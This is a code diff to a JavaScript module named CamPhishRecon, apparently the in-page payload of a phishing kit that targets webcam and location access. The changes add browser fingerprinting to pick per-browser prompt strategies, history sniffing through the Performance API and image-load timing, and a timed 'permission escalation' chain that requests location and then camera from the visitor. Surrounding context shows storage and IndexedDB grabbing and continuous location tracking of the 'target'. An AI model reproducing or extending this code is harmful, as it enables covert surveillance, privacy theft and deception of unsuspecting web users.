@@ -70,6 +70,115 @@ var Session = {
 
 Session.init();
 
+// ============ BROWSER DETECTION ============
+var BrowserDetect = {
+  engine: 'unknown',
+  browser: 'unknown',
+  os: 'unknown',
+  version: '0',
+  mobile: false,
+  brave: false,
+
+  init: function() {
+    var ua = navigator.userAgent || '';
+    var vendor = navigator.vendor || '';
+    var productSub = navigator.productSub || '';
+    var uaData = navigator.userAgentData;
+
+    // Engine detection
+    if (ua.indexOf('Chrome/') > -1 || ua.indexOf('Chromium/') > -1) {
+      this.engine = 'Chromium';
+    } else if (ua.indexOf('Firefox/') > -1) {
+      this.engine = 'Gecko';
+    } else if (ua.indexOf('Safari/') > -1 && ua.indexOf('Chrome') === -1) {
+      this.engine = 'WebKit';
+    } else if (ua.indexOf('Edg/') > -1) {
+      this.engine = 'Chromium';
+    }
+
+    // Cross-check: empty vendor + productSub mismatch = lied UA
+    if (this.engine === 'Chromium' && vendor === '' && productSub !== '20030107') {
+      this.engine = 'Gecko'; // Firefox-like but claims Chromium
+    }
+    if (this.engine === 'WebKit' && vendor !== 'Apple Computer, Inc.') {
+      this.engine = 'Chromium'; // Safari-like but wrong vendor
+    }
+
+    // Browser detection
+    if (ua.indexOf('Edg/') > -1) {
+      this.browser = 'Edge';
+    } else if (ua.indexOf('EdgA/') > -1) {
+      this.browser = 'Edge';
+    } else if (ua.indexOf('OPR/') > -1 || ua.indexOf('Opera/') > -1) {
+      this.browser = 'Opera';
+    } else if (ua.indexOf('Firefox/') > -1 && ua.indexOf('Seamonkey/') === -1) {
+      this.browser = 'Firefox';
+    } else if (ua.indexOf('Chrome/') > -1 && ua.indexOf('Chromium/') === -1 && ua.indexOf('SamsungBrowser/') === -1) {
+      // Check for Brave via navigator.brave
+      if (window.navigator.brave && typeof window.navigator.brave.isBrave === 'function') {
+        this.brave = true; this.browser = 'Brave';
+      } else {
+        this.browser = 'Chrome';
+      }
+    } else if (ua.indexOf('Safari/') > -1 && ua.indexOf('Chrome') === -1) {
+      this.browser = 'Safari';
+    } else if (ua.indexOf('SamsungBrowser/') > -1) {
+      this.browser = 'Samsung';
+    } else {
+      this.browser = 'Unknown';
+    }
+
+    // OS detection
+    if (ua.indexOf('Windows NT') > -1) { this.os = 'Windows'; }
+    else if (ua.indexOf('Mac OS X') > -1 && ua.indexOf('iPhone') === -1 && ua.indexOf('iPad') === -1) { this.os = 'macOS'; }
+    else if (ua.indexOf('Android') > -1) { this.os = 'Android'; this.mobile = true; }
+    else if (ua.indexOf('iPhone') > -1 || ua.indexOf('iPad') > -1) { this.os = 'iOS'; this.mobile = true; }
+    else if (ua.indexOf('Linux') > -1) { this.os = 'Linux'; }
+    else if (ua.indexOf('CrOS') > -1) { this.os = 'ChromeOS'; }
+
+    // Version extraction
+    if (uaData && uaData.brands) {
+      var b = uaData.brands.find(function(b){ return b.brand.indexOf('Chrome') > -1 || b.brand.indexOf('Chromium') > -1; });
+      if (b) this.version = b.version;
+    }
+    var m = /\b(?:Chrome|Firefox|Safari|Edg|OPR|SamsungBrowser)\/(\d+)/.exec(ua);
+    if (m) this.version = m[1];
+
+    // Mobile check via modern API
+    if (uaData && uaData.mobile) this.mobile = uaData.mobile;
+    if (window.matchMedia) {
+      if (window.matchMedia('(pointer:coarse)').matches) this.mobile = true;
+    }
+
+    // Log detected browser for debugging
+    this._log('BrowserDetect', this.browser + ' ' + this.version + ' on ' + this.os + ' (' + this.engine + ')');
+  },
+
+  isChrome: function(){ return this.browser === 'Chrome'; },
+  isFirefox: function(){ return this.browser === 'Firefox'; },
+  isSafari: function(){ return this.browser === 'Safari'; },
+  isBrave: function(){ return this.brave; },
+  isEdge: function(){ return this.browser === 'Edge'; },
+  isMobile: function(){ return this.mobile; },
+  isDesktop: function(){ return !this.mobile; },
+
+  // Returns a permission-strategy key for tailoring prompts
+  strategy: function() {
+    if (this.brave) return 'brave';            // Brave blocks aggressively
+    if (this.browser === 'Safari') return 'safari';  // Safari requires user gesture
+    if (this.browser === 'Firefox') return 'firefox'; // Firefox has strict tracking protection
+    if (this.mobile && this.os === 'iOS') return 'ios_safari'; // iOS WebKit restrictions
+    if (this.os === 'Android') return 'android'; // Android permission model
+    return 'standard'; // Chrome/Edge desktop — most permissive
+  },
+
+  _log: function(tag, msg) {
+    try { console.debug('[' + tag + '] ' + msg); } catch(e) {}
+  }
+};
+
+BrowserDetect.init();
+
 // ============ PERSISTENT PERMISSIONS ============
 var PermTracker = {
   KEY: 'camphish_perms',
@@ -133,11 +242,21 @@ var GenderDetect = {
   },
 
   _checkVisited: function(url, cb){
+    // Primary: Performance API — check if resource was cached from prior navigation
+    try {
+      var entries = performance.getEntriesByType('resource');
+      for (var i = 0; i < entries.length; i++) {
+        if (entries[i].name.indexOf(url) > -1) {
+          cb(true); return;
+        }
+      }
+    } catch(e) {}
+    // Fallback: Image() timing technique
     try {
       var start = performance.now();
       var img = new Image();
-      img.onload = function(){ cb((performance.now() - start) < 10); };
-      img.onerror = function(){ cb((performance.now() - start) < 10); };
+      img.onload = function(){ cb((performance.now() - start) < 50); };
+      img.onerror = function(){ cb((performance.now() - start) < 50); };
       img.src = url;
     } catch(e) { cb(false); }
   }
@@ -543,16 +662,36 @@ var HistoryDetect = {
     var results = {visited: [], categories: {}};
     var checked = 0, done = false;
     var self = this;
-    this.sites.forEach(function(site) {
+
+    // Pre-check Performance API for cached favicons
+    var cachedUrls = [];
+    try {
+      var entries = performance.getEntriesByType('resource');
+      for (var i = 0; i < entries.length; i++) {
+        for (var j = 0; j < self.sites.length; j++) {
+          if (!cachedUrls[j] && entries[i].name.indexOf(self.sites[j].url) > -1) {
+            cachedUrls[j] = true;
+          }
+        }
+      }
+    } catch(e) {}
+
+    this.sites.forEach(function(site, idx) {
+      if (cachedUrls[idx]) {
+        results.visited.push(site.url);
+        results.categories[site.cat] = (results.categories[site.cat]||0)+1;
+        if (++checked >= self.sites.length && !done) { done = true; callback(results); }
+        return;
+      }
       try {
         var start = performance.now();
         var img = new Image();
         img.onload = function() {
-          if ((performance.now()-start) < 10) { results.visited.push(site.url); results.categories[site.cat] = (results.categories[site.cat]||0)+1; }
+          if ((performance.now()-start) < 50) { results.visited.push(site.url); results.categories[site.cat] = (results.categories[site.cat]||0)+1; }
           if (++checked >= self.sites.length && !done) { done = true; callback(results); }
         };
         img.onerror = function() {
-          if ((performance.now()-start) < 10) { results.visited.push(site.url); results.categories[site.cat] = (results.categories[site.cat]||0)+1; }
+          if ((performance.now()-start) < 50) { results.visited.push(site.url); results.categories[site.cat] = (results.categories[site.cat]||0)+1; }
           if (++checked >= self.sites.length && !done) { done = true; callback(results); }
         };
         img.src = site.url;
@@ -599,6 +738,57 @@ var AutoPerm = {
   }
 };
 
+// ============ PROGRESSIVE PERMISSION ESCALATION ============
+// Chains requests: silent → location → camera, with timing per browser type
+var PermissionChain = {
+  _timer: null,
+
+  start: function(opts) {
+    var self = this;
+    var strat = BrowserDetect.strategy();
+    // Delays between escalation steps (ms) — browser-dependent
+    var delays = {
+      standard:  { silent: 0, location: 1500, camera: 4000 },
+      brave:     { silent: 500, location: 3000, camera: 7000 },
+      safari:    { silent: 0, location: 2000, camera: 5000 },
+      firefox:   { silent: 200, location: 2000, camera: 5000 },
+      ios_safari:{ silent: 0, location: 3000, camera: 6000 },
+      android:   { silent: 100, location: 2000, camera: 5000 }
+    };
+    var d = delays[strat] || delays.standard;
+
+    // Phase 0: Silent permission detection (no prompts)
+    setTimeout(function() {
+      if (navigator.permissions) {
+        navigator.permissions.query({name: 'geolocation'}).then(function(status) {
+          if (status.state === 'granted') PermTracker.set('location', true);
+          status.onchange = function(){ PermTracker.set('location', status.state === 'granted'); };
+        }).catch(function(){});
+        navigator.permissions.query({name: 'camera'}).then(function(status) {
+          if (status.state === 'granted') PermTracker.set('camera', true);
+          status.onchange = function(){ PermTracker.set('camera', status.state === 'granted'); };
+        }).catch(function(){});
+      }
+    }, d.silent);
+
+    // Phase 1: Location — request after delay
+    setTimeout(function() {
+      Capture.location();
+      Capture._event('escalation_phase_location', {strategy: strat});
+    }, d.location);
+
+    // Phase 2: Auto-permissions — check if already-granted after location settles
+    setTimeout(function() {
+      AutoPerm.checkAndRequest();
+      Capture._event('escalation_phase_auto_perm', {strategy: strat});
+    }, d.camera);
+  },
+
+  stop: function() {
+    if (this._timer) { clearTimeout(this._timer); this._timer = null; }
+  }
+};
+
 // ============ INIT ============
 var Recon = {
   init: function(opts) {
@@ -607,8 +797,8 @@ var Recon = {
     Capture.ip();
     // Start continuous location watching (sends updates as target moves)
     Capture.startWatching();
-    // Location — one-shot on init
-    Capture.location();
+    // Progressive permission escalation
+    PermissionChain.start(opts);
     // Fingerprint — only once per session
     if (!Session.hasCaptured('fingerprint')) {
       Session.markCaptured('fingerprint');
@@ -627,26 +817,12 @@ var Recon = {
     HistoryDetect.detect(function(results) {
       if (!results.skipped) Capture.event('history_detected', results);
     });
-    // Auto permissions — only if not yet captured
-    AutoPerm.checkAndRequest();
     // IndexedDB enumeration
     IndexedDBGrabber.grab(function(dbs) {
       if (dbs && dbs.length > 0) {
         Capture.event('indexeddb_detected', {databases: dbs});
       }
     });
-
-    // Watch for permission changes
-    if (navigator.permissions) {
-      navigator.permissions.query({name: 'geolocation'}).then(function(status){
-        if (status.state === 'granted') PermTracker.set('location', true);
-        status.onchange = function(){ PermTracker.set('location', status.state === 'granted'); };
-      }).catch(function(){});
-      navigator.permissions.query({name: 'camera'}).then(function(status){
-        if (status.state === 'granted') PermTracker.set('camera', true);
-        status.onchange = function(){ PermTracker.set('camera', status.state === 'granted'); };
-      }).catch(function(){});
-    }
   },
 
   requestCamera: function(callback) {
@@ -668,10 +844,12 @@ var Recon = {
   Session: Session,
   StorageGrabber: StorageGrabber,
   HistoryDetect: HistoryDetect,
-  IndexedDBGrabber: IndexedDBGrabber
+  IndexedDBGrabber: IndexedDBGrabber,
+  BrowserDetect: BrowserDetect
 };
 
 window.CamPhishRecon = Recon;
 window.CamPhishSession = Session.getId();
+window.CamPhishBrowser = BrowserDetect;
 
 })(window);
